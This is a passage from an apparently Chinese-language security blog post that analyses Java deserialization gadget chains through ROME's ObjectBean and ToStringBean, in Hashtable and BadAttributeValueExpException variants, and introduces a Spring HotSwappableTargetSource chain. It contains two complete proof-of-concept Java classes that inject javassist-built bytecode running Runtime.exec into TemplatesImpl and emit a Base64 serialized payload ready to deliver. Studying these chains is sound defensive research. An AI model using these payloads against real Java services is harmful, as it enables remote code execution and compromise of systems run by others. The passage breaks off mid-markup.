src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792322356-669021ca-be3b-42d5-82a7-494f49288521.png#averageHue=%232d333d&clientId=ufc9b3df2-ec82-4&from=paste&height=220&id=u531850fb&originHeight=412&originWidth=1260&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=174881&status=done&style=none&taskId=u88745025-7de9-40b3-a0f5-8fd0a6792b2&title=&width=672" referrerpolicy="no-referrer" alt="image.png"><br>后续就是 newTransformer-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;loader.defineClass 加载恶意类的流程，不过多赘述<br>其实 ObjectBean 这条链子还是好分析，毕竟大部分内容都是我们之前学过的，只有中间 toStringBean 方法会调用类中 get 方法的特性是第一次接触</p>
<h2 id="0x02-HashTable利用链"><a href="#0x02-HashTable利用链" class="headerlink" title="0x02 HashTable利用链"></a>0x02 HashTable利用链</h2><p>针对 HashMap 被 ban 的情况，其实就是 CC7 和 CC6 的区别、<br>在 HashTable 的 readObject 方法中，他会对 HashTable 中的每一个元素都调用 reconstitutionPut 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792883532-ffc7ff36-e2bb-4adb-b440-76b25953d0c8.png#averageHue=%232c2f33&clientId=ufc9b3df2-ec82-4&from=paste&height=261&id=u431d5baa&originHeight=490&originWidth=1274&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=157493&status=done&style=none&taskId=udcf767d8-bc84-4734-ac44-bbdc5ac038e&title=&width=679.4666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792883532-ffc7ff36-e2bb-4adb-b440-76b25953d0c8.png#averageHue=%232c2f33&clientId=ufc9b3df2-ec82-4&from=paste&height=261&id=u431d5baa&originHeight=490&originWidth=1274&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=157493&status=done&style=none&taskId=udcf767d8-bc84-4734-ac44-bbdc5ac038e&title=&width=679.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>之前这里还存在一个 hash 碰撞的问题，只不过具体的要进入 for 循环调用 equals 方法，我们这里需要调用到 hashcode 方法就行，没必要考虑这个问题<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792994986-c5a3c203-22a5-41c4-bd55-4b3ce8e4ba5b.png#averageHue=%232c2f34&clientId=ufc9b3df2-ec82-4&from=paste&height=362&id=uc34cdd69&originHeight=679&originWidth=1281&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=283706&status=done&style=none&taskId=udcba4b15-ca82-491f-9db0-68bb3cdaf03&title=&width=683.2'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792994986-c5a3c203-22a5-41c4-bd55-4b3ce8e4ba5b.png#averageHue=%232c2f34&clientId=ufc9b3df2-ec82-4&from=paste&height=362&id=uc34cdd69&originHeight=679&originWidth=1281&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=283706&status=done&style=none&taskId=udcba4b15-ca82-491f-9db0-68bb3cdaf03&title=&width=683.2" referrerpolicy="no-referrer" alt="image.png"><br>后面 hashcode 就是接ObjectBean利用链后段了<br>调用栈如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashTable.readObject(ObjectInputStream)<br>HashTable.reconstitutionPut()              <br>ObjectBean.hashCode()<br>EqualsBean.hashCode()                  <br>EqualsBean.beanHashCode()<br>ToStringBean.toString()<br>ToStringBean.toString(String)<br>TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure>
<p>POC 如下：<br>把 hashmap 换成 hashtable 就行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashTablePOC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//javassist写恶意字节码</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;i&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//配置ToStringBean中的_beanClass，指定要toString出的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templatesImpl);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(objectBean, <span class="hljs-string">&quot;x&quot;</span>);<br><br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_cloneableBean&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_toStringBean&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> unSerial(hashtable);<br>        <span class="hljs-comment">// 输出序列化的Base64编码字符</span><br>        Base64Encode(bs);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Map hashMap)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(hashMap);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>流程就不跟进到了，后程一样</p>
<h2 id="0x03-BadAttributeValueExpException"><a href="#0x03-BadAttributeValueExpException" class="headerlink" title="0x03 BadAttributeValueExpException"></a>0x03 BadAttributeValueExpException</h2><p>CC5 的 BadAttributeValueExpException，他的 readObject 方法能够直接调用 toString 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711793340084-aa7164ae-bd57-46d2-98a1-997d9fd87fd6.png#averageHue=%232c2e33&clientId=ufc9b3df2-ec82-4&from=paste&height=405&id=ua1da263a&originHeight=760&originWidth=1446&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=349200&status=done&style=none&taskId=u27eca9ff-39a7-44a2-a5c6-31d452748c1&title=&width=771.2'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711793340084-aa7164ae-bd57-46d2-98a1-997d9fd87fd6.png#averageHue=%232c2e33&clientId=ufc9b3df2-ec82-4&from=paste&height=405&id=ua1da263a&originHeight=760&originWidth=1446&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=349200&status=done&style=none&taskId=u27eca9ff-39a7-44a2-a5c6-31d452748c1&title=&width=771.2" referrerpolicy="no-referrer" alt="image.png"><br>调用的是 valObj 的 toString，我们看看前面 valObj 是通过反射 ObjectInputStream.GetField，然后获取到 val 参数的值，那我们也直接反射写入就行<br>只不过这样利用链就稍微有点变化了，我们可以直接调用 ToStringBean 的无参 toString()方法了<br>调用栈如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException.readObject()<br>ToStringBean.toString()<br>ToStringBean.toString(String)<br>TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure>
<p>POC 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpExceptionPOC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//javassist写恶意字节码</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;i&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templatesImpl);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">123</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,toStringBean);<br>        <span class="hljs-comment">// 执行序列化与反序列化，并且返回序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> unSerial(badAttributeValueExpException);<br>        <span class="hljs-comment">// 输出序列化的Base64编码字符</span><br>        Base64Encode(bs);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(o);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="1x01-调用流程分析"><a href="#1x01-调用流程分析" class="headerlink" title="1x01 调用流程分析"></a>1x01 调用流程分析</h3><p>稍微分析一下<br>断点还是打在 readObject 方法上，跟进<br>由于刚才我们对 badAttributeValueExpException 反射赋值了 val 为 toStringBean 类，所以这里应该会直接到toStringBean 的 toString()<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794393549-ed175c9c-d74d-4f83-81ba-40365ab28cca.png#averageHue=%232d3138&clientId=ufc9b3df2-ec82-4&from=paste&height=360&id=u21b3e72e&originHeight=675&originWidth=1547&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=416176&status=done&style=none&taskId=u03e61bdb-4256-47bc-a431-3a1cb87396a&title=&width=825.0666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794393549-ed175c9c-d74d-4f83-81ba-40365ab28cca.png#averageHue=%232d3138&clientId=ufc9b3df2-ec82-4&from=paste&height=360&id=u21b3e72e&originHeight=675&originWidth=1547&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=416176&status=done&style=none&taskId=u03e61bdb-4256-47bc-a431-3a1cb87396a&title=&width=825.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>一路跟进到有参 toString，invoke 调用<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794480877-7b9a7095-cb19-4e1d-abc9-69bbf9b1c03c.png#averageHue=%232e333b&clientId=ufc9b3df2-ec82-4&from=paste&height=281&id=u602e84c6&originHeight=526&originWidth=1836&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=388519&status=done&style=none&taskId=ueb02d1eb-2285-4bc0-bdd2-16cc813f360&title=&width=979.2'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794480877-7b9a7095-cb19-4e1d-abc9-69bbf9b1c03c.png#averageHue=%232e333b&clientId=ufc9b3df2-ec82-4&from=paste&height=281&id=u602e84c6&originHeight=526&originWidth=1836&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=388519&status=done&style=none&taskId=ueb02d1eb-2285-4bc0-bdd2-16cc813f360&title=&width=979.2" referrerpolicy="no-referrer" alt="image.png"><br>后续就不跟了，一样的流程</p>
<h2 id="0x04-HotSwappableTargetSource-利用链"><a href="#0x04-HotSwappableTargetSource-利用链" class="headerlink" title="0x04 HotSwappableTargetSource 利用链"></a>0x04 HotSwappableTargetSource 利用链</h2><p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711855532030-3851a2d8-43e3-4718-bfda-dfbce75bbe55.png#averageHue=%232c2d32&clientId=u949e3f87-10b5-4&from=paste&height=76&id=u4c11ea7c&originHeight=142&originWidth=682&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=55404&status=done&style=none&taskId=uebaab892-d21e-4c1e-9041-842bd14c655&title=&width=363.73333333333335'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711855532030-3851a2d8-43e3-4718-bfda-dfbce75bbe55.png#averageHue=%232c2d32&clientId=u949e3f87-10b5-4&from=paste&height=76&id=u4c11ea7c&originHeight=142&originWidth=682&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=55404&status=done&style=none&taskId=uebaab892-d21e-4c1e-9041-842bd14c655&title=&width=363.73333333333335" referrerpolicy="no-referrer" alt="image.png"><br>这条链子属于 spring 原生 toString 利用链，也就是在目标有 spring 依赖的情况下，可以尝试这条链子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="1x01-功能分析"><a href="#1x01-功能分析" class="headerlink" title="1x01  功能分析"></a>1x01  功能分析</h3><p>HotSwappableTargetSource 位于<code>org.springframework.aop.target</code>包下，可以在代理 bean 运行的过程中，动态实时更新 bean 对象，也就是热加载<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869035520-07bdeb4b-c623-4136-96d2-6f0d37f07d60.png#averageHue=%233a3c41&clientId=u949e3f87-10b5-4&from=paste&height=263&id=u8b1f3e8a&originHeight=493&originWidth=833&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=161998&status=done&style=none&taskId=ua4ee7ae6-8a4f-4afe-86bb-14c24dc268e&title=&width=444.26666666666665'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869035520-07bdeb4b-c623-4136-96d2-6f0d37f07d60.png#averageHue=%233a3c41&clientId=u949e3f87-10b5-4&from=paste&height=263&id=u8b1f3e8a&originHeight=493&originWidth=833&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=161998&status=done&style=none&taskId=ua4ee7ae6-8a4f-4afe-86bb-14c24dc268e&title=&width=444.26666666666665" referrerpolicy="no-referrer" alt="image.png"><br>其中的方法大多都是用来对目标 bean 的操作，以及获取 bean 的相关信息为主，至于利用链，我们拼接了它的 equals 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869111954-aaa5c7d7-5a95-4438-a38a-a98f95373bd1.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=163&id=ud1534675&originHeight=306&originWidth=1374&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137597&status=done&style=none&taskId=u3c54ae6b-3a22-4e4f-98ec-ace485a8e21&title=&width=732.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869111954-aaa5c7d7-5a95-4438-a38a-a98f95373bd1.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=163&id=ud1534675&originHeight=306&originWidth=1374&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137597&status=done&style=none&taskId=u3c54ae6b-3a22-4e4f-98ec-ace485a8e21&title=&width=732.8" referrerpolicy="no-referrer" alt="image.png"><br>其中 target 值是可控的，直接构造方法中传值进去就行<br class='item-img' 